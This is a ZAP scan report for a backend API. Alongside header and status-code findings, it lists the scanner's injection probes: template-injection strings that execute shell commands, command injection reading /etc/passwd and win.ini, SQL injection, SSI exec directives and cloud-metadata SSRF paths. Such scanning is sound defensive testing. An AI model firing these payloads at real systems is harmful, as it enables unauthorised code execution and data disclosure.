# ZAP Scanning Report

ZAP by [Checkmarx](https://checkmarx.com/).


## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 0 |
| Medium | 0 |
| Low | 3 |
| Informational | 3 |




## Insights

| Level | Reason | Site | Description | Statistic |
| --- | --- | --- | --- | --- |
| Medium | Exceeded High | http://backend:8000 | Percentage of responses with status code 4xx | 82 % |
| Low | Warning |  | ZAP warnings logged - see the zap.log file for details | 15    |
| Info | Informational | http://backend:8000 | Percentage of responses with status code 2xx | 15 % |
| Info | Informational | http://backend:8000 | Percentage of responses with status code 3xx | 1 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with content type application/json | 100 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method DELETE | 1 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method GET | 9 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method PATCH | 1 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method POST | 59 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method PUT | 29 % |
| Info | Informational | http://backend:8000 | Count of total endpoints | 407    |
| Info | Exceeded Low | http://backend:8000 | Percentage of slow responses | 5 % |







## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| A Server Error response code was returned by the server | Low | 2 |
| Cross-Origin-Resource-Policy Header Missing or Invalid | Low | Systemic |
| X-Content-Type-Options Header Missing | Low | Systemic |
| A Client Error response code was returned by the server | Informational | 401 |
| Authentication Request Identified | Informational | 1 |
| Non-Storable Content | Informational | Systemic |




## Alert Detail



### [ A Server Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Low (High)

### Description

A response code of 503 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: http://backend:8000/voice/token
  * Node Name: `http://backend:8000/voice/token`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `503`
  * Other Info: ``
* URL: http://backend:8000/voice/token/
  * Node Name: `http://backend:8000/voice/token/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `503`
  * Other Info: ``


Instances: 2

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Cross-Origin-Resource-Policy Header Missing or Invalid ](https://www.zaproxy.org/docs/alerts/90004/)



##### Low (Medium)

### Description

Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.

* URL: http://backend:8000/
  * Node Name: `http://backend:8000/`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://backend:8000/calls/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/calls/ (limit,skip)`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://backend:8000/calls/call_sid
  * Node Name: `http://backend:8000/calls/call_sid`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://backend:8000/health
  * Node Name: `http://backend:8000/health`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://backend:8000/calls/%3Fcall_sid=call_sid&duration=0&transcript=transcript&outcome=initiated
  * Node Name: `http://backend:8000/calls/ (call_sid,duration,outcome,transcript)`
  * Method: `POST`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: Systemic


### Solution

Ensure that the application/web server sets the Cross-Origin-Resource-Policy header appropriately, and that it sets the Cross-Origin-Resource-Policy header to 'same-origin' for all web pages.
'same-site' is considered as less secured and should be avoided.
If resources must be shared, set the header to 'cross-origin'.
If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Resource-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-resource-policy).

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 14

#### Source ID: 3

### [ X-Content-Type-Options Header Missing ](https://www.zaproxy.org/docs/alerts/10021/)



##### Low (Medium)

### Description

The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.

* URL: http://backend:8000/
  * Node Name: `http://backend:8000/`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://backend:8000/calls/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/calls/ (limit,skip)`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://backend:8000/calls/call_sid
  * Node Name: `http://backend:8000/calls/call_sid`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://backend:8000/health
  * Node Name: `http://backend:8000/health`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://backend:8000/calls/%3Fcall_sid=call_sid&duration=0&transcript=transcript&outcome=initiated
  * Node Name: `http://backend:8000/calls/ (call_sid,duration,outcome,transcript)`
  * Method: `POST`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`

Instances: Systemic


### Solution

Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.

### Reference


* [ https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85) ](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85))
* [ https://owasp.org/www-community/Security_Headers ](https://owasp.org/www-community/Security_Headers)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ A Client Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Informational (High)

### Description

A response code of 422 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: http://backend:8000/leads/10
  * Node Name: `http://backend:8000/leads/10`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/10/
  * Node Name: `http://backend:8000/leads/10/`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/5775699337756907199
  * Node Name: `http://backend:8000/5775699337756907199`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth
  * Node Name: `http://backend:8000/auth`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/
  * Node Name: `http://backend:8000/auth/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/7512942290486908185
  * Node Name: `http://backend:8000/auth/7512942290486908185`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/me/195312001193784478
  * Node Name: `http://backend:8000/auth/me/195312001193784478`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/calls/%3Fskip=http%253A%252F%252Fwww.google.com%252F&limit=100
  * Node Name: `http://backend:8000/calls/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/calls/2869881435088727613
  * Node Name: `http://backend:8000/calls/2869881435088727613`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/computeMetadata/v1/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/computeMetadata/v1/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/latest/meta-data/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/latest/meta-data/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fstatus=
  * Node Name: `http://backend:8000/leads/ (status)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/10
  * Node Name: `http://backend:8000/leads/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/10/
  * Node Name: `http://backend:8000/leads/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/10/1961815279977325888
  * Node Name: `http://backend:8000/leads/10/1961815279977325888`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/6096867783122128516
  * Node Name: `http://backend:8000/leads/6096867783122128516`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/metadata/instance%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/metadata/instance (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/metadata/v1%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/metadata/v1 (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/notifications/%3Fskip=http%253A%252F%252Fwww.google.com%252F&limit=100
  * Node Name: `http://backend:8000/notifications/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/notifications/442187663597163876
  * Node Name: `http://backend:8000/notifications/442187663597163876`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/notifications/actuator/health
  * Node Name: `http://backend:8000/notifications/actuator/health`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/opc/v1/instance/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/opc/v1/instance/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/opc/v2/instance/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/opc/v2/instance/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/openstack/latest/meta_data.json%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/openstack/latest/meta_data.json (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/pricing
  * Node Name: `http://backend:8000/pricing`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/pricing/
  * Node Name: `http://backend:8000/pricing/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/pricing/5232714363430710324
  * Node Name: `http://backend:8000/pricing/5232714363430710324`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/voice
  * Node Name: `http://backend:8000/voice`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/voice/
  * Node Name: `http://backend:8000/voice/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/voice/5963522119275654025
  * Node Name: `http://backend:8000/voice/5963522119275654025`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/me
  * Node Name: `http://backend:8000/auth/me ()({"first_name":"John Doe","last_name":"John Doe","email":zaproxy@example.com})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/me/
  * Node Name: `http://backend:8000/auth/me/ ()({"first_name":"John Doe","last_name":"John Doe","email":zaproxy@example.com})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status
  * Node Name: `http://backend:8000/leads/10/status`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status%3Fstatus=new
  * Node Name: `http://backend:8000/leads/10/status (status)`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status%3Fstatus=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://backend:8000/leads/10/status (status)`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status/
  * Node Name: `http://backend:8000/leads/10/status/`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/login
  * Node Name: `http://backend:8000/auth/login ()(client_id,client_secret,grant_type,password,scope,username)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/login/
  * Node Name: `http://backend:8000/auth/login/ ()(client_id,client_secret,grant_type,password,scope,username)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/me/password
  * Node Name: `http://backend:8000/auth/me/password ()({current_password,new_password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/auth/me/password
  * Node Name: `http://backend:8000/auth/me/password ()({current_password,new_password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/me/password/
  * Node Name: `http://backend:8000/auth/me/password/ ()({current_password,new_password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/auth/register
  * Node Name: `http://backend:8000/auth/register ()({username,password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/auth/register
  * Node Name: `http://backend:8000/auth/register ()({username,password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/register/
  * Node Name: `http://backend:8000/auth/register/ ()({username,password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/calls/
  * Node Name: `http://backend:8000/calls/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/calls/%3Fcall_sid=call_sid&duration=0&transcript=http%253A%252F%252Fwww.google.com%252F&outcome=initiated
  * Node Name: `http://backend:8000/calls/ (call_sid,duration,outcome,transcript)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/calls/%3Fcall_sid=call_sid&duration=http%253A%252F%252Fwww.google.com%252F&transcript=transcript&outcome=initiated
  * Node Name: `http://backend:8000/calls/ (call_sid,duration,outcome,transcript)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/
  * Node Name: `http://backend:8000/leads/ ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("#set($engine=\"\")\n#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"sleep 15\"))\n#set($null=$proc.waitFor())\n${null}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("#{%x(sleep 15)}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("${__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("+response.write({0}*{1})+")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("5;URL='https://6292097205271444573.owasp.org'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("5;URL='https://6292097205271444573.owasp.org/?John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("6292097205271444573.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)(";")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)(";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("<!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("<!--#EXEC cmd=\"dir \\\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("<!--#EXEC cmd=\"ls /\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 15\") }")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("<%=%x(sleep 15)%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe AND 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe AND 1=2 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe OR 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe&cat /etc/passwd&")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe&type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe' AND '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe' AND '1'='2' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe' OR '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe' UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe'&cat /etc/passwd&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe'&type %SYSTEMROOT%\\win.ini&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fname=ZAP&contact=contact&call_sid=call_sid&quote=&status=new
  * Node Name: `http://backend:8000/leads/ (call_sid,contact,name,quote,status)("John Doe') UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
